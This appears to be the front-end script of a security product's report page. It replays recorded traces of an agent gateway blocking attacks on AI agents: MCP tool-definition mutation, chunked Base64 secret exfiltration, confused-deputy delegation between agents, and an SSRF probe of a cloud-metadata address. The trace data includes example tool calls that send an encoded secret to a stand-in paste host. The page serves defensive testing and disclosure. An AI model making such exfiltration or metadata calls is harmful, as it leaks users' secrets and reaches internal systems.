/* AgentGate report page — vanilla JS, no dependencies, no network.
   RECORDINGS is the output of examples/record_site_traces.py (real PolicyEngine,
   McpWireProxy, toxic_combinations, audit_chain); this file only replays it. */
(function () {
  "use strict";

  var EMAIL = "mailto:alecagentboundary@gmail.com?subject=Book%2048-Hour%20Agentic%20Tool-Boundary%20Audit";

  var RECORDINGS = {"recorded_at":"2026-10-25T12:04:47Z","reps":30,"python":"3.13.17","traces":{"1":{"steps":[{"step":"tools/list (first)","args":"2 tools","verdict":"pinned","cpu_ms_median":0.17},{"step":"tools/list (re-issued)","args":"send_email description mutated","verdict":"rug_pull","cpu_ms_median":0.302},{"step":"tools/call lookup_order_status","args":"{\"order_id\": 7}","verdict":"mcp_rug_pull_hold","cpu_ms_median":1.203}],"chain":{"entries":3,"head":"f0e134a15cdb4bf9","verified":true}},"2":{"steps":[{"step":"read_internal_secrets","args":"{}","verdict":"allow","cpu_ms_median":0.209},{"step":"send_email #1","args":"{\"body\": \"c2Vjc\"}","verdict":"allow","cpu_ms_median":0.171},{"step":"send_email #2","args":"{\"body\": \"mV0X3\"}","verdict":"deobfuscated_exfil_detected","cpu_ms_median":0.529}],"chain":{"entries":3,"head":"709c20b4ab3a3f3c","verified":true}},"3":{"steps":[{"step":"analyze(inventory)","args":"5 tools","verdict":"12 toxic / 0 protected","cpu_ms_median":0.04}],"chain":null},"4":{"steps":[{"step":"read_external_url","args":"{\"url\": \"http://127.0.0.1/p\"}","verdict":"allow","cpu_ms_median":0.64},{"step":"send_email","args":"{\"to\": \"x@lab.local\", \"body\": \"hi\"}","verdict":"post_taint_outbound_gated","cpu_ms_median":1.368},{"step":"verify_chain_file(decision log)","args":"2 entries","verdict":"verified","cpu_ms_median":0.197}],"chain":{"entries":2,"head":"562bf496649dbd8c","verified":true}},"5":{"steps":[{"step":"A read_internal_secrets","args":"{}","verdict":"allow","cpu_ms_median":0.198},{"step":"A read_external_url","args":"{\"url\": \"http://127.0.0.1/p\"}","verdict":"allow","cpu_ms_median":0.685},{"step":"A delegate_task -> B","args":"{\"to_agent_key\": \"agk_lab_…\", \"to_session_id\": \"b\"}","verdict":"allow","cpu_ms_median":0.31},{"step":"B send_email (session b)","args":"{\"to\": \"x@lab.local\", \"body\": \"s\"}","verdict":"post_taint_outbound_gated","cpu_ms_median":1.331},{"step":"B send_email (fresh session)","args":"{\"to\": \"x@lab.local\", \"body\": \"hi\"}","verdict":"confused_deputy_delegation_blocked","cpu_ms_median":0.316},{"step":"B delegate_task -> A (cycle)","args":"{\"to_agent_key\": \"agk_lab_…\", \"to_session_id\": \"a2\"}","verdict":"allow","cpu_ms_median":0.312},{"step":"A send_email (session a2)","args":"{\"to\": \"x@lab.local\", \"body\": \"hi\"}","verdict":"confused_deputy_delegation_blocked","cpu_ms_median":0.231},{"step":"control: clean P -> Q, Q send_email","args":"{\"to\": \"a@b.c\"}","verdict":"allow","cpu_ms_median":0.063}],"chain":{"entries":6,"head":"2c4b6d15753876e6","verified":true}},"6":{"steps":[{"step":"read_internal_secrets","args":"{}","verdict":"allow","cpu_ms_median":0.193},{"step":"send_webhook","args":"{\"url\": \"http://0xA9FEA9FE/latest/meta-data\", \"payload\": \"x\"}","verdict":"ssrf_boundary_violation","cpu_ms_median":0.307},{"step":"send_webhook","args":"{\"url\": \"https://paste.example.net/u\", \"payload\": \"c2VjcmV0X3ZhbHVlXzEyM%2B…\"}","verdict":"deobfuscated_exfil_detected","cpu_ms_median":1.101}],"chain":{"entries":5,"head":"d510ce091e824c9c","verified":true,"frozen_agents":["lab-assistant-1","lab-worker-child"],"tainted":true}}}};

  /* Per-trace framing. `key` is the step index whose verdict and CPU time fill the fields. */
  var TRACES = {
    "1": {
      title: "MCP rug-pull: re-issued tools/list mutates a pinned tool",
      atlas: "≈ AML.T0051 (approximate)",
      carrier: "Ingest · tool-definition mutation",
      module: "mcp_proxy.py → pep.py",
      key: 2,
      desc: "The wire proxy pins sha256(name, description, inputSchema) on the first tools/list. A later listing that changes a pinned tool is a rug pull: the client keeps the pinned definition, the session is tainted, its agw1. capability loses egress, and every later call, even a read, waits for a person until a bound one-time approval releases it.",
      notes: [
        "pinned 2 tools · sha256 over canonical JSON",
        "send_email description changed → served the PINNED definition; session tainted; agw1. allow_egress=false",
        "review hold: every call needs a bound OOB approval (code -32050)"
      ]
    },
    "2": {
      title: "Split-chunk exfiltration of a Base64-encoded secret",
      atlas: "≈ AML.T0086 (approximate)",
      carrier: "C · split / encoded smuggling",
      module: "deobfuscate.py",
      key: -1,
      desc: "A sensitive read registers salted 8-character n-gram digests of the secret and of its Base64, hex, URL, and whitespace-stripped forms. Outbound arguments are concatenated across steps in a per-session window, so a value leaked five characters at a time is matched once enough of it has left. The session is not tainted here, so the sends are released until the window completes an n-gram.",
      notes: [
        "SENSITIVE_READ · fingerprints registered (raw · base64 · hex · url · ws)",
        "released · window holds 5 chars · no complete 8-gram",
        "window completes a base64-form 8-gram → denied (code -32031); registered key frozen 15 min"
      ]
    },
    "3": {
      title: "Static 2-hop / 3-hop toxic-flow reachability",
      atlas: "≈ AML.T0086 (approximate) · static analysis",
      carrier: "Reachability (static, no call made)",
      module: "toxic_combinations.py",
      key: 0,
      desc: "analyze() enumerates every path where an external_read can reach a send, write, or credential sink through internal or sensitive reads. web.fetch counts as a sink too, because its URL can carry data out in a query parameter. Toggle an agw1. boundary on a sink to see its paths flip to protected; the totals match the module for each combination. Static analysis of a declared tool list, not a penetration test.",
      notes: []
    },
    "4": {
      title: "Held call, approval payload, and chain verification",
      atlas: "≈ AML.T0086 (approximate) · tamper evidence",
      carrier: "Containment &amp; audit",
      module: "pep.py · approval_webhook.py · audit_chain.py",
      key: 1,
      desc: "Untrusted ingest taints the session. The next send is held, and an approval document is built in-process (Slack Block Kit plus a generic webhook body; no HTTP unless --webhook-deliver is set). The decision log is then re-verified: seq continuity, prev_hash links, and every entry_hash.",
      notes: [
        "untrusted ingest → session tainted; agw1. caveat allow_egress=false",
        "held for a person · approval payload built in-process: schema agent-gateway.approval_webhook/1, scrubbed args, one-time callback MACs shown as fingerprints",
        "seq / prev_hash / entry_hash continuous"
      ]
    },
    "5": {
      title: "Confused-deputy delegation, including a cycle",
      atlas: "≈ AML.T0051 / AML.T0086 (approximate)",
      carrier: "B · delegation laundering",
      module: "delegation_guard.py",
      key: 4,
      desc: "Agent A is tainted and has read a secret, then hands the task to a clean peer B. Each hand-off is a lattice meet: the recipient keeps every restriction either side carried, written as chained-HMAC caveats on its agw1. token, so B cannot strip them without the root key. B is then denied egress in any session, a cycle back to A cannot restore egress, and a clean hand-off between two clean agents still sends.",
      notes: [
        "sensitive history recorded",
        "tainted · agw1. caveat allow_egress=false",
        "meet A ∧ B → allow_egress=false, sensitive_read=true, taint source carried",
        "B's own session inherits the closed egress",
        "fresh session, clean-looking token · B's principal was barred upstream (code -32036)",
        "meet only moves down the lattice → a2 inherits allow_egress=false",
        "cycle cannot restore egress",
        "benign control: clean hand-off still sends"
      ]
    },
    "6": {
      title: "Encoded, watermarked secret aimed at metadata, then a public URI",
      atlas: "≈ AML.T0053 / AML.T0086 (approximate)",
      carrier: "C · encoded smuggling (+ SSRF)",
      module: "deobfuscate.py · canary_watermark.py · egress_uri_guard.py",
      key: 2,
      desc: "The sensitive read returns a secret carrying a zero-width HMAC watermark bound to (session, step, tool). A hex-spelled cloud-metadata address is canonicalized and denied. The guard allows public hosts, so the second send reaches the payload check, which URL-decodes, finds the Base64 run, matches the secret's n-gram digests, denies the call, taints the session, and freezes the registered key and its child for 15 minutes. A raw copy of the watermark would instead hit canary_watermark_exfil with the origin step as provenance.",
      notes: [
        "watermark woven in · fingerprints registered",
        "host 0xA9FEA9FE → canonical 169.254.169.254 · cloud_metadata_target (code -32032)",
        "url-decode → base64 run → n-gram match (code -32031) · session tainted · frozen: lab-assistant-1, lab-worker-child"
      ]
    }
  };

  /* ---------- helpers ---------- */
  function $(sel, root) { return (root || document).querySelector(sel); }
  function $all(sel, root) { return Array.prototype.slice.call((root || document).querySelectorAll(sel)); }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  function esc(s) {
    return String(s).replace(/[&<>"]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]; });
  }
  function fmt(ms) { return ms.toFixed(3) + " ms"; }

  var PASS = { allow: 1, pinned: 1, verified: 1 };
  var HOLD = { post_taint_outbound_gated: 1, mcp_rug_pull_hold: 1, rug_pull: 1 };
  function vclass(v) {
    if (PASS[v]) return "v-pass";
    if (HOLD[v]) return "v-hold";
    if (/toxic/.test(v)) return "v-info";
    return "v-deny";
  }
  function badge(v) { return '<span class="' + vclass(v) + '">' + esc(v) + "</span>"; }
  function lineClass(v) { return { "v-pass": "ok", "v-hold": "warn", "v-deny": "bad", "v-info": "muted" }[vclass(v)]; }

  /* ---------- trace inspector ---------- */
  var current = "1", busy = false, token = 0;
  var con = $("#console");

  function render(id) {
    var t = TRACES[id], rec = RECORDINGS.traces[id], steps = rec.steps;
    var k = t.key < 0 ? steps.length - 1 : t.key, s = steps[k];
    $("#tr-title").textContent = t.title;
    $("#tr-atlas").textContent = t.atlas;
    $("#f-carrier").innerHTML = t.carrier;
    $("#f-module").textContent = t.module;
    $("#f-input").textContent = s.step + " " + s.args;
    $("#f-verdict").innerHTML = badge(s.verdict);
    $("#f-cpu").textContent = fmt(s.cpu_ms_median) + " median of " + RECORDINGS.reps + " runs";
    var c = rec.chain;
    $("#f-chain").textContent = c
      ? c.entries + " entries · head " + c.head + "… · " + (c.verified ? "verify ok" : "verify FAILED")
      : "n/a — static analysis writes no decision-log entry";
    $("#tr-desc").textContent = t.desc;
    $("#steps tbody").innerHTML = steps.map(function (st, i) {
      return "<tr><td>" + String(i + 1).padStart(2, "0") + "</td><td><code>" + esc(st.step) + "</code></td><td class=\"args\">" +
        esc(st.args) + "</td><td>" + badge(st.verdict) + "</td><td class=\"num\">" + fmt(st.cpu_ms_median) + "</td></tr>";
    }).join("");
    var isGraph = id === "3";
    $("#graph-wrap").hidden = !isGraph;
    $("#replay-controls").hidden = isGraph;
    con.hidden = isGraph;
    if (isGraph) renderFlow();
    $("#rec-note").textContent = "Recorded " + RECORDINGS.recorded_at + " · Python " + RECORDINGS.python +
      " · thread CPU time per call, median of " + RECORDINGS.reps + " fresh in-process runs. Chain heads differ per recording (keys and timestamps). These are not the sprint-run figures in §1.";
    token++; busy = false; con.innerHTML = "";
  }

  async function replay() {
    if (busy) return;
    busy = true; var my = ++token;
    var t = TRACES[current], steps = RECORDINGS.traces[current].steps;
    con.innerHTML = "";
    write('$ replay trace ' + current.padStart(2, "0") + '  <span class="dim">recorded in-process · no network</span>', "muted");
    for (var i = 0; i < steps.length; i++) {
      await sleep(380); if (my !== token) return;
      var st = steps[i];
      write("→ " + esc(st.step) + "  " + '<span class="dim">' + esc(st.args) + "</span>", "step");
      await sleep(220); if (my !== token) return;
      write("  " + esc(st.verdict) + "  ·  " + fmt(st.cpu_ms_median) + " CPU", lineClass(st.verdict));
      if (t.notes[i]) write("  " + esc(t.notes[i]), "dim");
    }
    var c = RECORDINGS.traces[current].chain;
    if (c) { await sleep(300); if (my !== token) return; write("\n  decision log: " + c.entries + " chained entries · head " + c.head + "… · " + (c.verified ? "verify ok" : "verify FAILED"), c.verified ? "ok" : "bad"); }
    busy = false;
  }
  function write(html, cls) {
    var span = document.createElement("span");
    span.className = "line" + (cls ? " " + cls : "");
    span.innerHTML = html;
    con.appendChild(span);
    con.scrollTop = con.scrollHeight;
  }

  $all(".tab-btn").forEach(function (btn) {
    btn.addEventListener("click", function () {
      current = btn.getAttribute("data-tab");
      $all(".tab-btn").forEach(function (b) { b.setAttribute("aria-selected", b === btn ? "true" : "false"); });
      $("#panel").setAttribute("aria-labelledby", btn.id);
      render(current);
    });
  });
  $("#replay").addEventListener("click", replay);
  $("#reset").addEventListener("click", function () { token++; busy = false; con.innerHTML = ""; });

  /* ---------- trace 03: toxic-flow model (matches toxic_combinations.analyze on this inventory) ---------- */
  var INVENTORY = [
    { name: "web.fetch", cls: "external_read", urlSink: true, boundary: false },
    { name: "vault.read", cls: "sensitive_read" },
    { name: "file.read", cls: "internal_read" },
    { name: "send_email", cls: "send", boundary: false },
    { name: "http.post", cls: "send", boundary: false }
  ];
  function isSink(t) { return t.cls === "send" || t.cls === "write" || t.cls === "credential_use" || t.urlSink; }

  function enumeratePaths() {
    var src = INVENTORY.filter(function (t) { return t.cls === "external_read"; });
    var reads = INVENTORY.filter(function (t) { return t.cls === "internal_read" || t.cls === "sensitive_read"; });
    var sinks = INVENTORY.filter(isSink);
    var paths = [];
    src.forEach(function (s) {
      reads.forEach(function (r) { sinks.forEach(function (k) { paths.push({ nodes: [s, r, k], hops: 2, sink: k }); }); });
      reads.forEach(function (r1) {
        reads.forEach(function (r2) {
          if (r1 === r2) return;
          sinks.forEach(function (k) { paths.push({ nodes: [s, r1, r2, k], hops: 3, sink: k }); });
        });
      });
    });
    paths.forEach(function (p) { p.protected = !!p.sink.boundary; });
    return paths;
  }

  function renderFlow() {
    var toggles = $("#boundary-toggles");
    if (!toggles.childElementCount) {
      INVENTORY.filter(isSink).forEach(function (t) {
        var chip = document.createElement("button");
        chip.className = "chip";
        chip.setAttribute("data-on", String(!!t.boundary));
        chip.textContent = "agw1. boundary · " + t.name;
        chip.addEventListener("click", function () {
          t.boundary = !t.boundary;
          chip.setAttribute("data-on", String(t.boundary));
          renderFlow();
        });
        toggles.appendChild(chip);
      });
    }
    var paths = enumeratePaths();
    var toxic = paths.filter(function (p) { return !p.protected; }).length;
    $("#flow-table tbody").innerHTML = paths.map(function (p) {
      return "<tr><td>" + esc(p.nodes.map(function (n) { return n.name; }).join(" → ")) + "</td><td class=\"num\">" + p.hops +
        "</td><td class=\"num\">" + (p.protected ? '<span class="v-pass">agw1.</span>' : '<span class="v-deny">toxic</span>') + "</td></tr>";
    }).join("");
    $("#flow-count").innerHTML = "<strong>" + toxic + "</strong> toxic, <strong>" + (paths.length - toxic) +
      "</strong> protected, of " + paths.length + " enumerated. Recorded <code>analyze()</code> with no boundaries: " +
      esc(RECORDINGS.traces["3"].steps[0].verdict) + ".";

    var cols = [
      INVENTORY.filter(function (t) { return t.cls === "external_read"; }),
      INVENTORY.filter(function (t) { return t.cls === "internal_read" || t.cls === "sensitive_read"; }),
      INVENTORY.filter(isSink)
    ];
    var X = [16, 170, 318], pos = {};
    var parts = ['<style>text{font:11px "IBM Plex Mono",monospace;fill:#141413}.c{fill:#575653;font-size:10px}</style>'];
    ["source", "reads", "sinks"].forEach(function (title, ci) { parts.push('<text class="c" x="' + X[ci] + '" y="18">' + title + "</text>"); });
    cols.forEach(function (colNodes, ci) {
      colNodes.forEach(function (n, ri) { pos[ci + ":" + n.name] = { x: X[ci], y: 34 + ri * 52 }; });
    });
    paths.forEach(function (p) {
      for (var i = 0; i < p.nodes.length - 1; i++) {
        var ca = i === 0 ? 0 : 1, cb = i + 1 === p.nodes.length - 1 ? 2 : 1;
        var a = pos[ca + ":" + p.nodes[i].name], b = pos[cb + ":" + p.nodes[i + 1].name];
        if (!a || !b) continue;
        var x1 = a.x + 104, y1 = a.y + 11, x2 = b.x, y2 = b.y + 11, mx = (x1 + x2) / 2;
        if (ca === cb) { x1 = a.x + 104; x2 = b.x + 104; mx = x1 + 24; }
        parts.push('<path d="M' + x1 + "," + y1 + " C" + mx + "," + y1 + " " + mx + "," + y2 + " " + x2 + "," + y2 +
          '" fill="none" stroke="' + (p.protected ? "#166534" : "#991B1B") + '" stroke-width="1"' + (p.protected ? ' stroke-dasharray="3 3"' : "") + ' opacity=".7"/>');
      }
    });
    Object.keys(pos).forEach(function (key) {
      var n = pos[key], name = key.split(":")[1], node = INVENTORY.filter(function (t) { return t.name === name; })[0];
      var guarded = key.charAt(0) === "2" && node.boundary;
      parts.push('<rect x="' + n.x + '" y="' + n.y + '" width="104" height="22" fill="#FAF8F5" stroke="' + (guarded ? "#166534" : "#141413") + '" stroke-width="1"/>');
      parts.push('<text x="' + (n.x + 6) + '" y="' + (n.y + 15) + '">' + esc(name) + "</text>");
    });
    $("#flow-svg").innerHTML = parts.join("");
  }

  /* ---------- copy helpers ---------- */
  function toast(msg) {
    var t = $("#toast"); t.textContent = msg; t.classList.add("show");
    setTimeout(function () { t.classList.remove("show"); }, 2200);
  }
  function fallbackCopy(text) {
    var ta = document.createElement("textarea");
    ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
    document.body.appendChild(ta); ta.select();
    try { document.execCommand("copy"); } catch (e) { /* no-op */ }
    document.body.removeChild(ta);
  }
  function copy(text, done) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(done, function () { fallbackCopy(text); done(); });
    } else { fallbackCopy(text); done(); }
  }
  $("#copy-verify").addEventListener("click", function () {
    copy($("#verify-snippet").textContent, function () { toast("Commands copied"); });
  });
  $("#copy-template").addEventListener("click", function () {
    copy($("#email-template").textContent, function () {
      toast("Template copied — opening your email");
      setTimeout(function () { window.location.href = EMAIL; }, 650);
    });
  });

  render(current);
})();
